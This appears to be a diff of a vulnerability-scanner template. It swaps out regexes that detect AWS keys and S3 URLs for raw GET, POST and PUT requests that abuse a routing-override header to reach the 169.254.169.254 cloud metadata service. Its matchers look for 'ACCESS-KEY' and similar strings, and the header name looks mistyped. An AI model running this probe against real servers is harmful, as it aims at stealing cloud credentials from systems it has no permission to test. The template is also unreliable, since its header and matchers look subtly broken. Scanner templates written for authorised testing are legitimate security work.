@@ -1,22 +1,40 @@
-id: AWS
+id: aws
 
 info:
-  name: AWS
-  author: Saud Aleanzi @Dmaral3noz
-  severity: info
+  name: aws internal
+  author: MR.iambatman
+  severity: high
+  description: aws-find
 
-file:
-  - extensions:
-      - all
+requests:
 
-    extractors:
-      - type: regex
-        regex:
-          - "amzn\\.mws\\.[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}"
-          - "([^A-Z0-9]|^)(AKIA|A3T|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{12,}"
-          - "AKIA[0-9A-Z]{16}"
-          - "//s3-[a-z0-9-]+\\.amazonaws\\.com/[a-z0-9._-]+"
-          - "[a-z0-9.-]+\\.s3-[a-z0-9-]\\.amazonaws\\.com"
-          - "[a-z0-9.-]+\\.s3-website[.-](eu|ap|us|ca|sa|cn)"
-          - "//s3\\.amazonaws\\.com/[a-z0-9._-]+"
-          - "//s3-[a-z0-9-]+\\.amazonaws\\.com/[a-z0-9._-]+"
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+        I5d-dtab: /$/inet/169.254.169.254/80
+        Content-length: 100
+
+      - |
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+        I5d-dtab: /$/inet/169.254.169.254/80
+        Content-length: 100
+   
+      - |
+        PUT / HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+        I5d-dtab: /$/inet/169.254.169.254/80
+        Content-length: 100
+    
+    redirects: true
+    matchers:
+      - type: word
+        words:
+          - "latest"
+          - "ACCESS-KEY"
+          - "aws"
+
